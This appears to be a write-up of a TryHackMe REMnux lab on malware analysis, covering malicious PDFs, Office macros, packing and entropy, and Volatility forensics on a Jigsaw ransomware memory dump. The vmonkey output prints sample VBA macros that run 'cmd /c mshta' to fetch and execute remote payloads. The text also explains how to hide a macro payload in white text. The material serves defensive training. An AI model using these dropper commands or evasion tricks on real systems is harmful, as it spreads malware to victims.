---
A revitalised, hands-on showcase involving analysing malicious macro's, PDF's and Memory forensics of a victim of Jigsaw Ransomware; all done using the Linux-based REMnux toolset apart of my Malware Analysis series
---

### 1. Introduction 

![](https://remnux.org/img/remnux-logo.png)

Welcome to the redux of REMnux. 

Since the release of the previous REMnux room, REMnux has had substantial changes, rendering the previous room outdated and impossible to complete.

I have taken the opportunity to recreate the room covering REMnux from scratch, taking a very different approach to ensure you get to use all the facilities that make REMnux unique.

How Have I Designed This Room Differently?

I've now re-designed the content for this room to get you as hands-on with REMnux and its tools as possible...gone are the days of reading cheatsheets for tasks; it's time for you to get stuck in and see what REMnux is really about. This room isn't designed with point-farming in mind, instead, I hope to give you enough guidance throughout the room that results in you developing a curiosity in exploring the topics & resources I introduce you to in your own time. 

You will be doing the following:

    Identifying and analysing malicious payloads of various formats embedded in PDF's, EXE's and Microsoft Office Macros (the most common method that malware developers use to spread malware today)
    Learning how to identify obfuscated code and packed files - and in turn - analyse these.
    Analysing the memory dump of a PC that became infected with the Jigsaw ransomware in the real-world using Volatility.

I have attached some useful material about some of the topics covered in the room, alongside some cheatsheets and related articles that you can browse at your leisure at the end of the room.

As always, feedback of any sort is always appreciated. I hope that recreating the room in a completely different direction is well received and proves to be worth the wait. ~CMNatic


I'm all buckled up and ready to get started.
*No answer needed*

### 2. Deploy 

If you're using the machine in-browser, you can skip this task. If you want to manually SSH into the machine, read the following:

﻿Ensuring you are connected to the TryHackMe Network via OpenVPN, deploy the instance using the "Deploy" button and log in to your instance via SSH (on the standard port of 22). The necessary information to do is displayed below: 

IP Address: MACHINE_IP
Username: remnux
Password: malware


I've deployed my instance
*No answer needed*

### 3. Analysing Malicious PDF's 

﻿A Blast From the Past

We're back at this old chestnut, analysing malicious PDF files. In the previous room, you were analysing a PDF file for potential javascript code. PDF's are capable of containing many more types of code that can be executed without the user's knowledge. This includes:

    Javascript
    Python
    Executables
    Powershell Shellcode

Not only will this task be covering Javascript embeds (like we did previously), but also analysing embedded executables.

Looking for Embedded Javascript

We previously discussed how easily javascript can be embedded into a PDF file, whereupon opening is executed unbeknownst to the user. Javascript, much like other languages that we come on to discover in Task 4, provide a great way of creating a foothold, where additional malware can be downloaded and executed.

![](https://i.imgur.com/16r4ZtR.png)

Looks like the Cooctus Clan just wanted to say hey - it's a good thing that they're nice people!

Practical

We'll be using peepdf to begin a precursory analysis of a PDF file to determine the presence of Javascript. If there is, we will extract this Javascript code (without executing it) for our inspection.

We can simply do `peepdf demo_notsuspicious.pdf`:

![](https://i.imgur.com/yBhDeYi.png)

Note the output confirming that there's Javascript present, but also how it is executed? OpenAction will execute the code when the PDF is launched.

To extract this Javascript, we can use peepdf's "extract" module. This requires a few steps to set up but is fairly trivial.

The following command will create a script file for peepdf to use:

`echo 'extract js > javascript-from-demo_notsuspicious.pdf' > extracted_javascript.txt`

![](https://i.imgur.com/hYUwXuu.png)

The script will extract all javascript via extract js and pipe > the contents into "javascript-from-demo_notsuspicious.pdf"

We now need to tell peepdf the name of the script (extracted_javascript.txt) and the PDF file that we want to extract from (demo_notsuspicious.pdf): 

2. peepdf -s extracted_javascript.txt demo_notsuspicious.pdf

Remembering that the Javascript will output into a file called "javascript-from-demo_nonsuspicious.pdf" because of our script.

To recap: "extracted_javascript.txt" (highlighted in red) is our script, where "demo_notsuspicious.pdf" (highlighted in green) is the original PDF file that we think is malicious.

![](https://i.imgur.com/0q0dt9I.png)


You will see an output, in this case, a file named "javascript-from-demo_notsuspicious" (highlighted in yellow). This file now contains our extracted Javascript, we can simply cat this to see the contents.

![](https://i.imgur.com/zSLNeKV.png)

As it turns out, the PDF file we have analysed contains the javascript code of app.alert("All your Cooctus are belong to us!")

Practical
We have used peepdf to:
1. Look for the presence of Javascript
2. Extract any contained Javascript for us to read without it being executed.

![](https://i.imgur.com/gI35CYV.png)


The commands to do so have been used above, you may have to implement them differently, proceed to answer questions 1 - 4 before moving onto the next section.

Executables

Of course not only can Javascript be embedded, by executables can be very much too.

The "advert.pdf" actually has an embedded executable. Looking at the extracted Javascript, we can see the following Javascript snippet:

![](https://i.imgur.com/HkaEbdF.png)

This tells us that when the PDF is opened, the user will be asked to save an attachment:

![](https://i.imgur.com/2ABomDi.png)


Although PDF attachments can be ZIP files or images, in this case, it is another PDF...Or is it? Well, let's save the file and see what happens. Uh oh...At least that we get a warning that something is trying to execute, but hey, Karen from HR wouldn't send you a dodgy email, right? It's probably a false alarm.

![](https://i.imgur.com/daoeGoL.png)

Ah...Well, turns out it was. We just got a reverse shell from the Windows PC to my attack machine.

![](https://i.imgur.com/o9mP0CA.png)

It's now obvious (albeit too late for them) that the "pdf" that gets saved isn't a PDF. Let's open it up in a hex editor.

![](https://i.imgur.com/CSypGSC.png)

Well well well, looks like we have an executable. Let's investigate further by looking at the strings.

![](https://i.imgur.com/lVmoupA.png)

It looks like we have our attacker's IP and port!

![](https://i.imgur.com/wthxQE3.png)


```
remnux@thm-remnux:~/Tasks/3$ peepdf notsuspicious.pdf 
Warning: PyV8 is not installed!!

File: notsuspicious.pdf
MD5: 2992490eb3c13d8006e8e17315a9190e
SHA1: 75884015d6d984a4fcde046159f4c8f9857500ee
SHA256: 83fefd2512591b8d06cda47d56650f9cbb75f2e8dbe0ab4186bf4c0483ef468a
Size: 28891 bytes
Version: 1.7
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 3
URIs: 0
Comments: 0
Errors: 0

Version 0:
        Catalog: 1
        Info: 7
        Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18]
        Streams (3): [4, 15, 18]
                Encoded (2): [15, 18]
        Objects with JS code (1): [6]
        Suspicious elements:
                /OpenAction (1): [1]
                /JS (1): [6]
                /JavaScript (1): [6]



remnux@thm-remnux:~/Tasks/3$ peepdf advert.pdf 
Warning: PyV8 is not installed!!

File: advert.pdf
MD5: 1b79db939b1a77a2f14030f9fd165645
SHA1: e760b618943fe8399ac1af032621b6e7b327a772
SHA256: 09bb03e57d14961e522446e1e81184ca0b4e4278f080979d80ef20dacbbe50b7
Size: 74870 bytes
Version: 1.7
Binary: True
Linearized: False
Encrypted: False
Updates: 2
Objects: 29
Streams: 6
URIs: 0
Comments: 0
Errors: 1

Version 0:
        Catalog: 1
        Info: 9
        Objects (22): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
        Compressed objects (7): [10, 11, 12, 13, 14, 15, 16]
        Streams (5): [4, 17, 19, 20, 22]
                Xref streams (1): [22]
                Object streams (1): [17]
                Encoded (4): [4, 17, 19, 22]
        Suspicious elements:
                /Names (1): [13]


Version 1:
        Catalog: 1
        Info: 9
        Objects (0): []
        Streams (0): []

Version 2:
        Catalog: 1
        Info: 9
        Objects (7): [1, 3, 24, 25, 26, 27, 28]
        Streams (1): [26]
                Encoded (1): [26]
        Objects with JS code (1): [27]
        Suspicious elements:
                /OpenAction (1): [1]
                /Names (2): [24, 1]
                /AA (1): [3]
                /JS (1): [27]
                /Launch (1): [28]
                /JavaScript (1): [27]

remnux@thm-remnux:~/Tasks/3$ ls
advert.pdf  notsuspicious.pdf
remnux@thm-remnux:~/Tasks/3$ echo 'extract js > javascript-from-notsuspicious.pdf' > extracted_javascript.txt
remnux@thm-remnux:~/Tasks/3$ cat extracted_javascript.txt 
extract js > javascript-from-notsuspicious.pdf
remnux@thm-remnux:~/Tasks/3$ peepdf -s extracted_javascript.txt notsuspicious.pdf
remnux@thm-remnux:~/Tasks/3$ ls
advert.pdf                javascript-from-notsuspicious.pdf
extracted_javascript.txt  notsuspicious.pdf
remnux@thm-remnux:~/Tasks/3$ cat javascript-from-notsuspicious.pdf 
// peepdf comment: Javascript code located in object 6 (version 0)

app.alert("THM{Luckily_This_Isn't_Harmful}");remnux@thm-remnux:~/Tasks/3$ 

remnux@thm-remnux:~/Tasks/3$ ls
advert.pdf                javascript-from-notsuspicious.pdf
extracted_javascript.txt  notsuspicious.pdf
remnux@thm-remnux:~/Tasks/3$ echo 'extract js > javascript-from-advert.pdf' > extracted_javascript2.txt
remnux@thm-remnux:~/Tasks/3$ ls
advert.pdf                 javascript-from-notsuspicious.pdf
extracted_javascript2.txt  notsuspicious.pdf
extracted_javascript.txt
remnux@thm-remnux:~/Tasks/3$ cat extracted_javascript2.txt 
extract js > javascript-from-advert.pdf
remnux@thm-remnux:~/Tasks/3$ peepdf -s extracted_javascript2.txt advert.pdf
remnux@thm-remnux:~/Tasks/3$ ls
advert.pdf                 javascript-from-advert.pdf
extracted_javascript2.txt  javascript-from-notsuspicious.pdf
extracted_javascript.txt   notsuspicious.pdf
remnux@thm-remnux:~/Tasks/3$ cat javascript-from-advert.pdf 
// peepdf comment: Javascript code located in object 27 (version 2)

this.exportDataObject({
    cName: "notsuspicious",
    nLaunch: 0
});remnux@thm-remnux:~/Tasks/3$ 
```

How many types of categories of "Suspicious elements" are there in "notsuspicious.pdf"
*3*

Use peepdf to extract the javascript from "notsuspicious.pdf". What is the flag?
*THM{Luckily_This_Isn't_Harmful}*

How many types of categories of "Suspicious elements" are there in "advert.pdf"
*6*

Now use peepdf to extract the javascript from "advert.pdf". What is the value of "cName"?
*notsuspicious*

### 4. Analysing Malicious Microsoft Office Macros 

The Change in Focus from APT's

Malware infection via malicious macros (or scripts within Microsoft Office products such as Word and Excel) are some of the most successful attacks to date.

For example, current APT campaigns such as Emotet, QuickBot infect users by sending seemingly legitimate documents attached to emails i.e. an invoice for business. However, once opened, execute malicious code without the user knowing. This malicious code is often used in what's known as a "dropper attack", where additional malicious programs are downloaded onto the host.

Take the document file below as an example:

![](https://i.imgur.com/ciosaCD.png)

Looks perfectly okay, right? Well in actual fact, this word document has just downloaded a ransomware file from a malicious IP address in the background, with not much more than this snippet of code:

![](https://i.imgur.com/DQxSeHt.png)

I have programmed the script to show a pop-up for demonstration purposes. However, in real life, this would be done without any popup.

![](https://i.imgur.com/SVT0kOZ.png)

Luckily for me, this EXE is safe. Unfortunately in the real-world, this EXE could start encrypting my files. 

Thankfully Anti-Viruses these days are pretty reliable on picking up that sort of activity when it is left in plaintext. The following example uses two-stages to execute an obfuscated payload code.

    The macro starts once edit permissions ("Enable Edit" or "Enable Content")have enabled edit mode on the Word document
    The macro executes the payload stored in the text within the document.

The downside to this? You need a large amount of text to be contained within the page, users will be suspicious and not proceed with editing the document.

![](https://i.imgur.com/5Td2ywE.png)

Although, just put on your steganography hat...Authors can just remove the borders from the text box and make the text white. The macro doesn't need the text to be visible to the user, it just needs to exist on the page.

![](https://i.imgur.com/DMhsuTd.png)

See? Not so suspicious now.

Practical

First, we will analyse a suspicious Microsoft Office Word document together. We can simply use REMnux's vmonkey which is a parser engine that is capable of analysing visual basic macros without executing (opening the document).

By using vmonkey DefinitelyALegitInvoice.doc. vmonkey has detected potentially malicious visual basic code within a macro.

![](https://i.imgur.com/jooSji9.png)

Now it's your turn, analyse the two Microsoft Office document's (.doc) files located within "/home/remnux/Tasks/4" to answer the questions attached to this task.

```
remnux@thm-remnux:~/Tasks$ cd 4
remnux@thm-remnux:~/Tasks/4$ ls
DefinitelyALegitInvoice.doc  Taxes2020.doc
remnux@thm-remnux:~/Tasks/4$ vmonkey DefinitelyALegitInvoice.doc 
 _    ___                 __  ___            __             
| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
     /_/                                           /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: DefinitelyALegitInvoice.doc
INFO     Starting emulation...
INFO     Emulating an Office (VBA) file.
INFO     Reading document metadata...
Traceback (most recent call last):
  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
    from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERROR    Running export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_4517180779']' returned non-zero exit status 1        
ERROR    Reading in file as Excel with xlrd failed. Can't find workbook in OLE2 compound document                                                   
INFO     Saving dropped analysis artifacts in .//DefinitelyALegitInvoice.doc_artifacts/                                                             
INFO     Parsing VB...
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file:  - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Private Sub DefoLegit()
    Shell ("cmd /c mshta http://10.0.0.10:4444/MyDropper.exe")
End Sub
-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Sub DefoLegit (): 1 statement(s)
INFO     Reading document variables...
INFO     Reading document comments...
INFO     Reading Shapes object text fields...
INFO     Reading InlineShapes object text fields...
INFO     Reading TextBox and RichEdit object text fields...
INFO     Reading custom document properties...
INFO     Reading embedded object text fields...
INFO     Reading document text and tables...
Traceback (most recent call last):
  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py", line 17, in <module>
    from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERROR    Running export_doc_text.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py', '--text', '-f', '/tmp/tmp_word_file_5917811720']' returned non-zero exit status 1         
INFO     Reading form variables...

-------------------------------------------------------------------------------
TRACING VBA CODE (entrypoint = Auto*):
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/sType/ResourceEvent'                                                   
INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'                                                        
INFO     Found possible intermediate IOC (URL): 'http://purl.org/dc/elements/1.1/'                                                                  
INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'                                             
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/mm/'                                                                   
INFO     Found possible intermediate IOC (URL): 'http://10.0.0.10:4444/MyDropper.exe'                                                               
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/photoshop/1.0/'                                                                
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/'                                                                      
INFO     Emulating loose statements...
WARNING  No entry points found. Using heuristics to find entry points...
INFO     ACTION: Found Heuristic Entry Point - params 'DefoLegit' - 
INFO     evaluating Sub DefoLegit
INFO     Calling Procedure: Shell("['cmd /c mshta http://10.0.0.10:4444/MyDropper.exe']")                                                           
INFO     Shell('cmd /c mshta http://10.0.0.10:4444/MyDropper.exe')
INFO     ACTION: Execute Command - params 'cmd /c mshta http://10.0.0.10:4444/MyDropper.exe' - Shell function                                       
INFO     ACTION: Found Heuristic Entry Point - params 'DefoLegit' - 
INFO     evaluating Sub DefoLegit
INFO     Calling Procedure: Shell("['cmd /c mshta http://10.0.0.10:4444/MyDropper.exe']")                                                           
INFO     Shell('cmd /c mshta http://10.0.0.10:4444/MyDropper.exe')
INFO     ACTION: Execute Command - params 'cmd /c mshta http://10.0.0.10:4444/MyDropper.exe' - Shell function                                       

Recorded Actions:
+----------------------+---------------------------+----------------+
| Action               | Parameters                | Description    |
+----------------------+---------------------------+----------------+
| Found Heuristic      | DefoLegit                 |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://10.0. | Shell function |
|                      | 0.10:4444/MyDropper.exe   |                |
| Found Heuristic      | DefoLegit                 |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://10.0. | Shell function |
|                      | 0.10:4444/MyDropper.exe   |                |
+----------------------+---------------------------+----------------+

INFO     Found 7 possible IOCs. Stripping duplicates...
VBA Builtins Called: ['Shell']

Finished analyzing DefinitelyALegitInvoice.doc .

```


What is the name of the Macro for "DefinitelyALegitInvoice.doc"
*DefoLegit*


```

remnux@thm-remnux:~/Tasks/4$ vmonkey Taxes2020.doc 
 _    ___                 __  ___            __             
| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
     /_/                                           /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: Taxes2020.doc
INFO     Starting emulation...
INFO     Emulating an Office (VBA) file.
INFO     Reading document metadata...
Traceback (most recent call last):
  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
    from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERROR    Running export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_6874051711']' returned non-zero exit status 1        
ERROR    Reading in file as Excel with xlrd failed. Can't find workbook in OLE2 compound document                                                   
INFO     Saving dropped analysis artifacts in .//Taxes2020.doc_artifacts/
INFO     Parsing VB...
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file:  - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Private Sub X544FE()
    Shell ("cmd /c mshta http://tryhackme.com/notac2cserver.sh")
End Sub
-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Sub X544FE (): 1 statement(s)
INFO     Reading document variables...
INFO     Reading document comments...
INFO     Reading Shapes object text fields...
INFO     Reading InlineShapes object text fields...
INFO     Reading TextBox and RichEdit object text fields...
INFO     Reading custom document properties...
INFO     Reading embedded object text fields...
INFO     Reading document text and tables...
Traceback (most recent call last):
  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py", line 17, in <module>
    from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERROR    Running export_doc_text.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_doc_text.py', '--text', '-f', '/tmp/tmp_word_file_6155421071']' returned non-zero exit status 1         
INFO     Reading form variables...

-------------------------------------------------------------------------------
TRACING VBA CODE (entrypoint = Auto*):
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/sType/ResourceEvent'                                                   
INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'                                                        
INFO     Found possible intermediate IOC (URL): 'http://purl.org/dc/elements/1.1/'                                                                  
INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'                                             
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/mm/'                                                                   
INFO     Found possible intermediate IOC (URL): 'http://tryhackme.com/notac2cserver.sh'                                                             
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/photoshop/1.0/'                                                                
INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/'                                                                      
INFO     Emulating loose statements...
WARNING  No entry points found. Using heuristics to find entry points...
INFO     ACTION: Found Heuristic Entry Point - params 'X544FE' - 
INFO     evaluating Sub X544FE
INFO     Calling Procedure: Shell("['cmd /c mshta http://tryhackme.com/notac2cserver.sh']")                                                         
INFO     Shell('cmd /c mshta http://tryhackme.com/notac2cserver.sh')
INFO     ACTION: Execute Command - params 'cmd /c mshta http://tryhackme.com/notac2cserver.sh' - Shell function                                     
INFO     ACTION: Found Heuristic Entry Point - params 'X544FE' - 
INFO     evaluating Sub X544FE
INFO     Calling Procedure: Shell("['cmd /c mshta http://tryhackme.com/notac2cserver.sh']")                                                         
INFO     Shell('cmd /c mshta http://tryhackme.com/notac2cserver.sh')
INFO     ACTION: Execute Command - params 'cmd /c mshta http://tryhackme.com/notac2cserver.sh' - Shell function                                     

Recorded Actions:
+----------------------+---------------------------+----------------+
| Action               | Parameters                | Description    |
+----------------------+---------------------------+----------------+
| Found Heuristic      | X544FE                    |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://tryha | Shell function |
|                      | ckme.com/notac2cserver.sh |                |
| Found Heuristic      | X544FE                    |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://tryha | Shell function |
|                      | ckme.com/notac2cserver.sh |                |
+----------------------+---------------------------+----------------+

INFO     Found 7 possible IOCs. Stripping duplicates...
VBA Builtins Called: ['Shell']

Finished analyzing Taxes2020.doc .

```


What is the URL the Macro in "Taxes2020.doc" would try to launch?

`http://tryhackme.com/notac2cserver.sh`

###  5. I Hope You Packed Your Bags 

REMnux® is a Linux toolkit for reverse-engineering and analyzing malicious software. 
But first: Entropy 101

There's a reason why I've waited until now to discuss file entropy in the malware series.

REMnux provides a nice range of command-line tools that allow for bulk or semi-automated classification and static analysis. File entropy is very indicative of the suspiciousness of a file and is a prominent characteristic that these tools look for within a Portable Executable (PE).

At it's very simplest, file entropy is a rating that scores how random the data within a PE file is. With a scale of 0 to 8. 0 meaning the less "randomness" of the data in the file, where a scoring towards 8 indicates this data is more "random".

For example, files that are encrypted will have a very high entropy score. Where files that have large chunks of the same data such as "1's" will have a low entropy score.

Okay...so?

Malware authors use techniques such as encryption or packing (we'll come onto this next) to obfuscate their code and to attempt to bypass anti-virus. Because of this, these files will have high entropy. If an analyst had 1,000 files, they could rank the files by their entropy scoring, of course, the files with the higher entropy should be analysed first.

![](https://i.imgur.com/4lgx8FM.png)

Whereas however, this file would have a high entropy because there's no pattern to the data - it's a lot more random in comparison.

![](https://i.imgur.com/kX0JcNy.png)

Packing and Unpacking

I briefly discussed this in my   MAL: Introductory room, but that doesn't do this topic justice.

We'll start with a bit of theory (so bare with me here) on how packing works and why it's used. Packer's use an executable as a source and output's it to another executable. This executable will have had some modifications made depending on the packer. For example, the new executable could be compressed and/or obfuscated by using mathematics.

Legitimate software developers use packing to reduce the size of their applications and to ultimately protect their work from being stolen. It is, however, a double-edged sword, malware authors reap the benefits of packing to make the reverse engineering and detection of the code hard to impossible.

Executables have what's called an entry point. When launched, this entry point is simply the location of the first pieces of code to be executed within the file - as illustrated below:

![](https://i.imgur.com/gZgqg2n.png)

   (Sikorski and Honig, 2012)

When an executable is packed, it must unpack itself before any code can execute. Because of this, packers change the entry point from the original location to what's called the "Unpacking Stub".

![](https://i.imgur.com/zKEDArl.png)
    (Sikorski and Honig, 2012)

The "Unpacking Stub" will begin to unpack the executable into its original state. Once the program is fully unpacked, the entry point will now relocate back to its normal place to begin executing code:

![](https://i.imgur.com/o3dRrTh.png)
     (Sikorski and Honig, 2012)

It is only at this point can an analyst begin to understand what the executable is doing as it is now in it's true, original form.

Determining if an Executable is Packed

Don't worry, learning how to manually unpack an executable is out-of-scope for this pathway. We have a few tools at our arsenal that should do a sufficient job for most of the samples we come across in the wild.

Packed files have a few characteristics that may indicate whether or not they are packed:

    Remember about file entropy? Packed files will have a high entropy!
    There are very few "Imports", packed files may only have "GetProcAddress" and "LoadLibrary".
    The executable may have sections named after certain packers such as UPX.

Demonstration

I have two copies of my application, one not packed and another has been packed.

Below we can see that this copy has 34 imports, so a noticeable amount and the imports are quite revealing in what we can expect the application to do:


![](https://i.imgur.com/HdG2Gol.png)

Whereas the other copy only presents us with 6 imports.

![](https://i.imgur.com/5TZ8pa5.png)
We can verify that this was packed using UPX via tools such as [PEID](https://www.aldeid.com/wiki/PEiD), or by manually comparing the executables sections and filesize differences.

![](https://i.imgur.com/jgp7geN.png)

Look at that entropy! 7.526 out of 8! Also, note the name of the sections. UPX0 and the entry point being at UPX1...that's our packer.

![](https://i.imgur.com/BKlrTA0.png)

What is the highest file entropy a file can have? 
*8*


What is the lowest file entropy a file can have?
*0*


Name a common packer that can be used for applications?
*UPX*

### 6. How's Your Memory? 

If you've had enough of hearing about entropy and packing - I don't blame you, me too.

Memory Forensics

This section is a supplement to DarkStar's room on the fundamentals of using Volatility which I highly recommend checking out. This task was more of an in-impromptu "when in Rome" sort of idea. I thought it'd be fun to be able to learn about then transfer knowledge to a real-world scenario.

You are going to be analysing the memory dump I've taken of a Windows 7 PC that has been infected with the Jigsaw Ransomware. This memory dump can be found in "/home/remnux/Tasks/6/Win7-Jigsaw.raw".

![](https://i.imgur.com/hzhY3OC.png)

A Volatility Crash Course

Understanding our Memory Dump

It goes without saying that every operating system will store data in different places, and this is no different when data is stored within memory. Volatility is unable to assume what the operating system that we have created a memory dump is, and in turn, where to look for things and what commands can be executed. For example, hivelist is used for Windows registry and will not work on a Linux memory dump.

Whilst Volatility can't assume, it can guess. Here's where profiles come into play. In other scenarios, we would use the imageinfo plugin to help determine what profile is most suitable with the syntax of volatility -f Win7-Jigsaw.raw imageinfo. However, this could take hours to complete on a large memory dump on an Instance like that attached to the room. So instead, I have provided it for you.

Please note that volatility will take a few minutes for commands to complete.

![](https://i.imgur.com/vSyKXJl.png)

Profile `Win7SP1x64` is the first suggested and just happens to be the correct OS version.

Beginning our Investigation

Viewing What Processes Were Running at Infection

"A process, in the simplest terms, is an executing program." (Processes and Threads - Win32 apps, 2018)

Processes range from every-day applications such as your browser to system services and other inner-workings.

Specifically, we need to identify the malicious processes to get an understanding of how the malware works and to also build a picture of Indicators of Compromise (IoC). We can list the processes that were running via pslist:

	volatility -f Win7-Jigsaw.raw --profile=Win7SP1x64 pslist

Note how you can see Google Chrome within the process because the application was running at the time of the memory dump.

![](https://i.imgur.com/pZwWizH.png)

Needles in Haystacks

Luckily we've got quite a shortlist of processes here, so we can start to narrow down between the system processes and any applications.

It can be daunting at first in trying to decide on what's worthy of investigating. As your seat time in malware analysis increases, you'll be able to pick out abnormalities. In this case, it's process "drpbx.exe" with a PID of 3704.

What Can We Do With This?

Now that we've identified the abnormal process, we can begin to dump this specifically and begin analysing. As the application will be unpacked and/or in it's most revealing state, it is perfect for analysis.

Peeking Behind the Curtain

Even without analysing, we can start to understand what sort of interaction the process is capable of with the operating system. DLL's are structured very similarly to executables, however, they cannot be directly executed. Moreover, multiple applications can interact with a DLL all at the same time. We can list the DLL's that "drpbx.exe" references with dlllist:

All the DLL'S

Again, it's easy to become overwhelmed at trying to figure out what's of significance. It only comes with time, experience and research into what Windows DLL's do what.

![](https://i.imgur.com/S7aICI0.png)

What stands out initially is the "CRYPTBASE.dll"

![](https://i.imgur.com/r1qtrXJ.png)

This DLL is a Windows library that allows applications to use cryptography. Whilst many use it legitimately, i.e. HTTPS, let's assume that we didn't know that the host was infected with ransomware specifically, we'd need to start investigating the process further. However, that is not for here. We've found enough evidence to suspect ransomware through memory forensics & research.


Pretty interesting stuff!
*No answer needed*

### 7. Finishing Up 



I encourage you to go back through the tasks and use alternate tools to that which I used, all located within the attached REMnux box. Malicious macros within Microsoft Office documents are very successful and dangerous vehicles for malware authors to weaponise. Whilst macros have legitimate purposes in MS Office documents, rampant APT campaigns such as Emotet, Ryuk and Qakbot exploit these as droppers.

For a bonus challenge, spend some more time in getting familiar with Volatility. Are there any more additional indicators of compromise within the Windows 7 memory dump that we briefly analyzed?

So long and thanks for all the fish ~CMNatic.


Fin.

### 8. References & Further Reading Material 



References

Task 1

Zeltser Security Corp., 2020. REMnux (image) Retrieved from: https://remnux.org/

Task 5

Sikorski, M. and Honig, A., 2012. Practical Malware Analysis. San Francisco: No Starch Press, pp.386-387.

Task 6

Docs.microsoft.com. 2018. Processes And Threads - Win32 Apps. Retrieved from: https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads

Additional Reading

A Look At Entropy Analysis (https://fsec404.github.io/blog/Shanon-entropy/)

[BlackHat 2019] Investigating Malware Using Memory Forensics (Video)(https://www.youtube.com/watch?v=BMFCdAGxVN4)

Malware Threat Report - Q2 2020 (Avira)(https://www.avira.com/en/blog/malware-threat-report-q2-2020-statistics-and-trends)

Malware Detection in PDF and Office Documents: A survey(https://api.semanticscholar.org/CorpusID:212680542%20(P.%20Singh,%20S.%20Tapaswi,%20S.Gupta))

Cheatsheets

REMnux 7.0 Documentation(https://docs.remnux.org/)

Volatility 2.4. Windows & Linux Profile Cheatsheets(https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)


I'm curious to read up some more!

[[Autopsy]]
